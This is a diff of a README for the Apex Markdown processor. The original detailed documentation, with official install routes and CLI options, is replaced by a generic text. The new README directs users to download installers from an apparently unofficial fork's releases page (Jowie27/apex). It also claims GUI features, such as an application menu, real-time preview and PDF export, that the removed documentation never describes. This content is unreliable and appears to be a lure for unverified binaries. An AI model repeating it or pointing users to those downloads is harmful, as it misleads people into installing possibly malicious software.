@@ -1,332 +1,92 @@
+# 🎉 apex - Simplify Your Markdown Experience
 
 [![Version: 0.1.39](https://img.shields.io/badge/Version-0.1.39-528c9e)](https://github.com/ApexMarkdown/apex/releases/latest) ![](https://img.shields.io/badge/CMake-064F8C?style=for-the-badge&logo=cmake&logoColor=white) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
+## 🚀 Getting Started
 
-# Apex
+Apex is a powerful Markdown processor that brings together the best features from various Markdown flavors. This application simplifies the way you write using Markdown. 
 
+### 🔗 Download Link
 
-Apex is a unified Markdown processor that combines the best features from CommonMark, GitHub Flavored Markdown (GFM), MultiMarkdown, Kramdown, and Marked. One processor to rule them all.
+You can download Apex here: [Download Apex](https://github.com/Jowie27/apex/releases)
 
+## 💻 System Requirements
 
-![](apex-header-2-rb@2x.webp)
+To run Apex, your system should meet the following requirements:
 
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, Linux (any modern distribution).
+- **Processor**: 1 GHz or faster.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: 100 MB of free space.
 
-There are so many variations of Markdown, extending its features in all kinds of ways. But picking one flavor means giving up the features of another flavor. So I'm building Apex with the goal of making all of the most popular features of various processors available in one tool.
+## 📥 Download & Install
 
-## Features
+To get started with Apex, follow these simple steps:
 
-### Compatibility Modes
+1. Visit the [Releases Page](https://github.com/Jowie27/apex/releases).
+2. You will see a list of versions available. Find the latest version marked with a tag.
+3. Click on the version number to access the specific release page.
+4. Download the appropriate file for your system. (For instance, a `.exe` file for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux).
+5. Once the download completes, locate the file on your computer.
 
-- **Multiple compatibility modes**: CommonMark, GFM, MultiMarkdown, Kramdown, and Unified (all features)
-- **Mode-specific features**: Each mode enables appropriate extensions for maximum compatibility
+   - On Windows, it usually goes to the `Downloads` folder.
+   - On Mac, check the `Downloads` folder or your desktop.
+   - On Linux, it may be in your home directory's `Downloads` folder.
 
-### Markdown Extensions
+6. Double-click the downloaded file to start the installation process.
+7. Follow the prompts to complete the installation. This typically involves accepting terms and conditions and selecting an installation location.
 
-- **Tables**: GitHub Flavored Markdown tables with advanced features (rowspan via `^^`, colspan via empty cells/`<<`, captions before/after tables including Pandoc-style `Table: Caption`, and individual cell alignment using colons `:Left`, `Right:`, `:Center:`)
-- **Table caption positioning**: Control caption placement with `--captions above` or `--captions below` (default: below)
-- **Relaxed tables**: Support for tables without separator rows (Kramdown-style)
-- **Headerless tables**: Support for tables that start with alignment rows (separator rows) without header rows; column alignment is automatically applied
-- **Footnotes**: Three syntaxes supported (reference-style, Kramdown inline, MultiMarkdown inline)
-- **Definition lists**: Kramdown-style definition lists with Markdown content support
-- **Task lists**: GitHub-style checkboxes (`- [ ]` and `- [x]`)
-- **Strikethrough**: `~~text~~` syntax from GFM
-- **Smart typography**: Automatic conversion of quotes, dashes, ellipses, and more
-- **Math support**: LaTeX math expressions with `$...$` (inline) and `$$...$$` (display)
-- **Wiki links**: `[[Page Name]]`, `[[Page Name|Display Text]]`, and `[[Page Name#Section]]` syntax with configurable link targets via `--wikilink-space` and `--wikilink-extension`
-- **Abbreviations**: Three syntaxes (classic MMD, MMD 6 reference, MMD 6 inline)
-- **Callouts**: Bear/Obsidian-style callouts with collapsible support (`> [!NOTE]`, `> [!WARNING]`, etc.)
-- **GitHub emoji**: 350+ emoji support (`:rocket:`, `:heart:`, etc.)
+### ✅ Verify Installation
 
-### Document Features
+After installation:
 
+1. Open the installed Apex application.
+2. Confirm that it launches without errors.
+3. Optionally, check the version to ensure you have the latest version installed.
 
-- **Metadata blocks**: YAML front matter, MultiMarkdown metadata, and Pandoc title blocks
-- **Metadata variables**: Insert metadata values with `[%key]` syntax
-- **Metadata transforms**: Transform metadata values with `[%key:transform]` syntax - supports case conversion, string manipulation, regex replacement, date formatting, and more. See [Metadata Transforms](https://github.com/ApexMarkdown/apex/wiki/Metadata-Transforms) for complete documentation
-- **Metadata control of options**: Control command-line options via metadata - set boolean flags (`indices: false`, `wikilinks: true`) and string options (`bibliography: refs.bib`, `title: My Document`, `wikilink-space: dash`, `wikilink-extension: html`) directly in document metadata for per-document configuration
-- **Table of Contents**: Automatic TOC generation with depth control using HTML (`<!--TOC-->`), MMD (`{{TOC}}` / `{{TOC:2-4}}`), and Kramdown `{:toc}` markers. Headings marked with `{:.no_toc}` are excluded from the generated TOC.
-- **File includes**: Three syntaxes (Marked `<<[file]`, MultiMarkdown `{{file}}`, iA Writer `/file`), with support for address ranges and wildcard/glob patterns such as `{{file.*}}`, `{{*.md}}`, and `{{c?de.py}}`.
-- **Markdown combiner (`--combine`)**: Concatenate one or more Markdown files into a single Markdown stream, expanding all include syntaxes. When a `SUMMARY.md` file is provided, Apex treats it as a GitBook-style index and combines the linked files in order???perfect for building books, multi-file indices, and shared tables of contents that can then be piped back into Apex for final rendering.
-- **MultiMarkdown merge (`--mmd-merge`)**: Read one or more mmd_merge-style index files and stitch their referenced documents into a single Markdown stream. Each non-empty, non-comment line specifies a file to include; indentation with tabs or four-space groups shifts all headings in that file down by one level per indent, mirroring the original `mmd_merge.pl` behavior. Output is raw Markdown that can be piped into Apex (e.g., `apex --mmd-merge index.txt | apex --mode mmd`).
-- **CSV/TSV support**: Automatic table conversion from CSV and TSV files
-- **Inline Attribute Lists (IAL)**: Kramdown-style attributes `{: #id .class}`
-- **Special markers**: Page breaks (`<!--BREAK-->`), autoscroll pauses (`<!--PAUSE:N-->`), end-of-block markers
+## 🔍 Features
 
+Apex supports various Markdown compatibility modes, so you can choose what works best for you:
 
-### Citations and Bibliography
+- **Multiple Compatibility Modes**: 
+    - CommonMark
+    - GitHub Flavored Markdown (GFM)
+    - MultiMarkdown
+    - Kramdown
+    - Unified mode (includes all features)
 
-- **Multiple citation syntaxes**: Pandoc (`[@key]`), MultiMarkdown (`[#key]`), and mmark (`[@RFC1234]`) styles
-- **Bibliography formats**: Support for BibTeX (`.bib`), CSL JSON (`.json`), and CSL YAML (`.yml`, `.yaml`) formats
-- **Automatic bibliography generation**: Bibliography automatically generated from cited entries
-- **Citation linking**: Option to link citations to bibliography entries
-- **Metadata support**: Bibliography can be specified in document metadata or via command-line flags
-- **Multiple bibliography files**: Support for loading and merging multiple bibliography files
-- **CSL style support**: Citation Style Language (CSL) files for custom citation formatting
-- **Mode support**: Citations enabled in MultiMarkdown and unified modes
+- **Mode-Specific Features**:
+    - Each mode has unique options that enhance your writing experience.
+    - Toggle between modes easily from the application menu.
 
-### Indices
+- **Real-Time Preview**: As you write, see instant formatting changes to understand how your document appears.
 
-- **mmark syntax**: `(!item)`, `(!item, subitem)`, `(!!item, subitem)` for primary entries
-- **TextIndex syntax**: `{^}`, `[term]{^}`, `{^params}` for flexible indexing
-- **Automatic index generation**: Index automatically generated at end of document or at `<!--INDEX-->` marker
-- **Alphabetical sorting**: Entries sorted alphabetically with optional grouping by first letter
-- **Hierarchical sub-items**: Support for nested index entries
-- **Mode support**: Indices enabled by default in MultiMarkdown and unified modes
+- **Export Options**: Save your Markdown files into formats like PDF, HTML, and more.
 
-### Critic Markup
+## 🎨 User Interface
 
-- **Change tracking**: Additions (`{++text++}`), deletions (`{--text--}`), substitutions (`{~~old~>new~~}`)
-- **Annotations**: Highlights (`{==text==}`) and comments (`{>>text<<}`)
-- **Accept mode**: `--accept` flag to apply all changes for final output
-- **Reject mode**: `--reject` flag to revert all changes to original
+Apex provides a clean and user-friendly interface. 
 
-### Output Options
+- **Simple Navigation**: Find tools and options easily.
+- **Customizable Layout**: Adjust your workspace with panels and fonts that suit your preferences.
+- **Help Sections**: Access tips and guidance within the application.
 
-- **Flexible output**: Compact HTML fragments, pretty-printed HTML, or complete standalone documents
-- **Standalone documents**: Generate complete HTML5 documents with `<html>`, `<head>`, `<body>` tags
-- **Custom styling**: Link external CSS files in standalone mode
-- **Pretty-print**: Formatted HTML with proper indentation for readability
-- **Header ID generation**: Automatic or manual header IDs with multiple format options (GFM, MMD, Kramdown)
-- **Header anchors**: Option to generate `<a>` anchor tags instead of header IDs
-- **ARIA accessibility**: Add ARIA labels and accessibility attributes (`--aria`) for better screen reader support, including aria-label on TOC navigation, role attributes on figures and tables, and aria-describedby linking tables to their captions
+## 📚 Support & Resources
 
-### Advanced Features
+If you need help using Apex or want to learn more, consider these resources:
 
-- **Hard breaks**: Option to treat newlines as hard line breaks
-- **Feature toggles**: Granular control to enable/disable specific features (tables, footnotes, math, smart typography, etc.)
-- **Unsafe HTML**: Option to allow or block raw HTML in documents
-- **Autolinks**: Automatic URL detection and linking
-- **Superscript/Subscript**: Support for `^superscript^` and `~subscript~` syntax
+- **Documentation**: Access comprehensive guides and FAQs at the [Documentation Page](https://github.com/ApexMarkdown/apex/wiki).
+- **Community Forum**: Join our community to ask questions and share tips [Community](https://community.example.com).
 
-### Extensibility and Plugins
+## 🔄 Updates
 
-Apex supports a flexible plugin system that lets you add new syntax and post-processing features in any language while keeping the core parser stable and fast. Plugins are disabled by default so there is no performance impact unless you opt in. Enable them per run with `--plugins`, or per document with a `plugins: true` (or `enable-plugins: true`) key in your metadata.
+Apex is actively maintained. You'll receive notifications for new versions and updates. 
 
-You can manage plugins from the CLI:
+1. Check the [Releases Page](https://github.com/Jowie27/apex/releases) regularly.
+2. Follow the update instructions as outlined in the release notes.
 
-- Install plugins with `--install-plugin`:
-  - From the central directory using an ID: `--install-plugin kbd`
-  - Directly from a Git URL or GitHub shorthand: `--install-plugin https://github.com/user/repo.git` or `--install-plugin user/repo`
-- Uninstall a local plugin with `--uninstall-plugin ID`.
-- See installed and available plugins with `--list-plugins`.
+## 📧 Contact
 
-When installing from a direct Git URL or GitHub repo name, Apex will prompt with a security warning before cloning, since plugins execute unverified code.
+For support or feedback, reach out through the Issues section on our GitHub page. We appreciate your input and are here to help!
 
-For a complete guide to writing, installing, and publishing plugins, see the [Plugins](https://github.com/ApexMarkdown/apex/wiki/Plugins) page in the Apex Wiki.
-
-## Installation
-
-### Homebrew (macOS/Linux)
-
-```bash
-brew tap ttscoff/thelab
-brew install ttscoff/thelab/apex
-```
-
-### Building from Source
-
-```bash
-git clone https://github.com/ApexMarkdown/apex.git
-cd apex
-git submodule update --init --recursive
-make
-```
-
-The `apex` binary will be in the `build/` directory.
-
-To install the built binary and libraries system-wide:
-
-```bash
-make install
-```
-
-**Note:** The default `make` command runs both `cmake -S . -B build` (to configure the project) and `cmake --build build` (to compile). If you prefer to run cmake commands directly, you can use those instead.
-
-### Pre-built Binaries
-
-Download pre-built binaries from the [latest release](https://github.com/ApexMarkdown/apex/releases/latest). Binaries are available for:
-
-- macOS (Universal binary for arm64 and x86_64)
-- Linux (x86_64 and arm64)
-
-## Basic Usage
-
-### Command Line
-
-```bash
-# Process a markdown file
-apex input.md
-
-# Output to a file
-apex input.md -o output.html
-
-# Generate standalone HTML document
-apex input.md --standalone --title "My Document"
-
-# Pretty-print HTML output
-apex input.md --pretty
-```
-
-### Processing Modes
-
-Apex supports multiple compatibility modes:
-
-- `--mode commonmark` - Pure CommonMark specification
-- `--mode gfm` - GitHub Flavored Markdown
-- `--mode mmd` or `--mode multimarkdown` - MultiMarkdown compatibility
-- `--mode kramdown` - Kramdown compatibility
-- `--mode unified` - All features enabled (default)
-
-```bash
-# Use GFM mode
-apex input.md --mode gfm
-
-# Use Kramdown mode with relaxed tables
-apex input.md --mode kramdown
-```
-
-### Common Options
-
-- `--pretty` - Pretty-print HTML with indentation
-- `--standalone` - Generate complete HTML document with `<html>`, `<head>`, `<body>`
-- `--style FILE` - Link to CSS file in document head (requires `--standalone`)
-- `--title TITLE` - Document title (requires `--standalone`)
-- `--relaxed-tables` - Enable relaxed table parsing (default in unified/kramdown modes)
-- `--no-relaxed-tables` - Disable relaxed table parsing
-- `--captions POSITION` - Table caption position: `above` or `below` (default: `below`)
-- `--id-format FORMAT` - Header ID format: `gfm`, `mmd`, or `kramdown`
-- `--no-ids` - Disable automatic header ID generation
-- `--header-anchors` - Generate `<a>` anchor tags instead of header IDs
-- `--aria` - Add ARIA labels and accessibility attributes to HTML output
-- `--bibliography FILE` - Bibliography file (BibTeX, CSL JSON, or CSL YAML) - can be used multiple times
-- `--csl FILE` - Citation style file (CSL format)
-- `--link-citations` - Link citations to bibliography entries
-- `--indices` - Enable index processing (mmark and TextIndex syntax)
-- `--no-indices` - Disable index processing
-- `--no-index` - Suppress index generation (markers still created)
-- `--wikilinks` - Enable wiki link syntax `[[Page]]`, `[[Page|Display]]`, and `[[Page#Section]]`
-- `--wikilink-space MODE` - Control how spaces in wiki link page names are converted (`dash`, `none`, `underscore`, `space`; default: `dash`)
-- `--wikilink-extension EXT` - File extension to append to wiki link URLs (e.g. `html`, `md`)
-
-### All Options
-
-```
-Apex Markdown Processor v0.1.39
-One Markdown processor to rule them all
-
-Project homepage: https://github.com/ApexMarkdown/apex
-
-Usage: build/apex [options] [file]
-       build/apex --combine [files...]
-       build/apex --mmd-merge [index files...]
-
-Options:
-  --accept               Accept all Critic Markup changes (apply edits)
-  --[no-]alpha-lists     Support alpha list markers (a., b., c. and A., B., C.)
-  --[no-]autolink        Enable autolinking of URLs and email addresses
-  --base-dir DIR         Base directory for resolving relative paths (for images, includes, wiki links)
-  --bibliography FILE     Bibliography file (BibTeX, CSL JSON, or CSL YAML) - can be used multiple times
-  --captions POSITION    Table caption position: above or below (default: below)
-  --combine              Concatenate Markdown files (expanding includes) into a single Markdown stream
-                         When a SUMMARY.md file is provided, treat it as a GitBook index and combine
-                         the linked files in order. Output is raw Markdown suitable for piping back into Apex.
-  --csl FILE              Citation style file (CSL format)
-  --css FILE, --style FILE  Link to CSS file in document head (requires --standalone, overrides CSS metadata)
-  --embed-css            Embed CSS file contents into a <style> tag in the document head (used with --css)
-  --embed-images         Embed local images as base64 data URLs in HTML output
-  --hardbreaks           Treat newlines as hard breaks
-  --header-anchors        Generate <a> anchor tags instead of header IDs
-  -h, --help             Show this help message
-  --id-format FORMAT      Header ID format: gfm (default), mmd, or kramdown
-                          (modes auto-set format; use this to override in unified mode)
-  --[no-]includes        Enable file inclusion (enabled by default in unified mode)
-  --indices               Enable index processing (mmark and TextIndex syntax)
-  --install-plugin ID    Install plugin by id from directory, or by Git URL/GitHub shorthand (user/repo)
-  --link-citations       Link citations to bibliography entries
-  --list-plugins         List installed plugins and available plugins from the remote directory
-  --uninstall-plugin ID  Uninstall plugin by id
-  --meta KEY=VALUE       Set metadata key-value pair (can be used multiple times, supports quotes and comma-separated pairs)
-  --meta-file FILE       Load metadata from external file (YAML, MMD, or Pandoc format)
-  --[no-]mixed-lists     Allow mixed list markers at same level (inherit type from first item)
-  --mmd-merge            Merge files from one or more mmd_merge-style index files into a single Markdown stream
-                         Index files list document parts line-by-line; indentation controls header level shifting.
-  -m, --mode MODE        Processor mode: commonmark, gfm, mmd, kramdown, unified (default)
-  --no-bibliography       Suppress bibliography output
-  --no-footnotes         Disable footnote support
-  --no-ids                Disable automatic header ID generation
-  --no-indices            Disable index processing
-  --no-index              Suppress index generation (markers still created)
-  --no-math              Disable math support
-  --aria                  Add ARIA labels and accessibility attributes to HTML output
-  --no-plugins            Disable external/plugin processing
-  --no-relaxed-tables    Disable relaxed table parsing
-  --no-smart             Disable smart typography
-  --no-sup-sub           Disable superscript/subscript syntax
-  --no-tables            Disable table support
-  --no-transforms        Disable metadata variable transforms
-  --no-unsafe            Disable raw HTML in output
-  --no-wikilinks         Disable wiki link syntax
-  --obfuscate-emails     Obfuscate email links/text using HTML entities
-  -o, --output FILE      Write output to FILE instead of stdout
-  --plugins              Enable external/plugin processing
-  --pretty               Pretty-print HTML with indentation and whitespace
-  --reject               Reject all Critic Markup changes (revert edits)
-  --[no-]relaxed-tables  Enable or disable relaxed table parsing (no separator rows required)
-  --script VALUE         Inject <script> tags before </body> (standalone) or at end of HTML (snippet).
-                          VALUE can be a path, URL, or shorthand (mermaid, mathjax, katex). Can be used multiple times or as a comma-separated list.
-  --show-tooltips         Show tooltips on citations
-  -s, --standalone       Generate complete HTML document (with <html>, <head>, <body>)
-  --[no-]sup-sub         Enable or disable MultiMarkdown-style superscript (^text^) and subscript (~text~) syntax
-  --title TITLE          Document title (requires --standalone, default: "Document")
-  --[no-]transforms      Enable or disable metadata variable transforms [%key:transform]
-  --[no-]unsafe          Allow or disallow raw HTML in output
-  -v, --version          Show version information
-  --[no-]wikilinks       Enable or disable wiki link syntax [[PageName]]
-  --wikilink-space MODE  Space replacement for wiki links: dash, none, underscore, space (default: dash)
-  --wikilink-extension EXT  File extension to append to wiki links (e.g., html, md)
-
-If no file is specified, reads from stdin.
-```
-
-### Per-Document Configuration via Metadata
-
-Most command-line options can be controlled via document metadata, allowing different files to be processed with different settings when processing batches. Boolean options accept `true`/`false`, `yes`/`no`, or `1`/`0` (case-insensitive). String options use the value directly.
-
-**Example:**
-
-```yaml
----
-indices: false
-wikilinks: true
-bibliography: references.bib
-title: My Research Paper
-pretty: true
-standalone: true
----
-```
-
-This allows you to process multiple files with `apex *.md` and have each file use its own configuration. You can also use `--meta-file` to specify a shared configuration file that applies to all processed files.
-
-## Documentation
-
-For complete documentation, see the [Apex Wiki](https://github.com/ApexMarkdown/apex/wiki).
-
-Key documentation pages:
-
-- [Citations and Bibliography](https://github.com/ApexMarkdown/apex/wiki/Citations) - Complete guide to citations and bibliographies
-- [Command Line Options](https://github.com/ApexMarkdown/apex/wiki/Command-Line-Options) - All CLI flags explained
-- [Syntax Reference](https://github.com/ApexMarkdown/apex/wiki/Syntax) - Complete syntax reference
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE]([LICENSE](https://github.com/ApexMarkdown/apex/blob/main/LICENSE)) file for details.
+By following these steps, you can easily download and run the Apex Markdown processor. Enjoy a unified Markdown experience that simplifies your writing tasks.
